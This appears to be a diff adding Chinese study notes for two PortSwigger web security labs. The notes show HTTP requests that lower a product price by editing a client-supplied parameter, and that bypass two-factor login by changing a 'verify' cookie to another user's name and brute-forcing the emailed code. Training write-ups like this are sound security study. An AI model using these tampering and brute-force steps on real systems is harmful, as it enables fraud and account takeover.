@@ -1,0 +1,46 @@
+https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-excessive-trust-in-client-side-controls
+# 使用客户端数据设置商品价格 #
+注入点，将商品添加到购物车的功能
+POST /cart HTTP/2
+消息体为
+productId=1&redir=PRODUCT&quantity=1&price=133700
+
+修改价格
+productId=1&redir=PRODUCT&quantity=1&price=1
+
+
+https://portswigger.net/web-security/authentication/multi-factor/lab-2fa-broken-logic
+# 跳过多阶段访问的一部分 #
+注入点，输入验证码的登录第二阶段
+登录第一阶段提交用户名与密码
+POST /login HTTP/2
+消息体为
+username=wiener&password=peter
+
+第一阶段响应为
+HTTP/2 302 Found
+Location: /login2
+Set-Cookie: verify=wiener; HttpOnly
+Set-Cookie: session=hoPd5mt9slUVBOyN6HM5AnNTdTaoiqLX; Secure; HttpOnly; SameSite=None
+
+对第二阶段页面的请求将收到邮件验证码
+GET /login2 HTTP/2
+Cookie: session=hoPd5mt9slUVBOyN6HM5AnNTdTaoiqLX; verify=wiener
+
+提交第二阶段邮件验证码
+POST /login2 HTTP/2
+Cookie: session=hoPd5mt9slUVBOyN6HM5AnNTdTaoiqLX; verify=wiener
+消息体为
+mfa-code=1961
+
+攻击步骤：
+将服务器返回的cookie修改为目标用户名 verify=carlos
+使用对第二阶段页面的请求消息，触发目标账户的邮件收到验证码
+GET /login2 HTTP/2
+Cookie: session=hoPd5mt9slUVBOyN6HM5AnNTdTaoiqLX; verify=carlos
+
+将第二阶验证码提交post转发到攻击器中爆破
+POST /login2 HTTP/2
+Cookie: session=hoPd5mt9slUVBOyN6HM5AnNTdTaoiqLX; verify=carlos
+消息体为
+mfa-code=$0000$
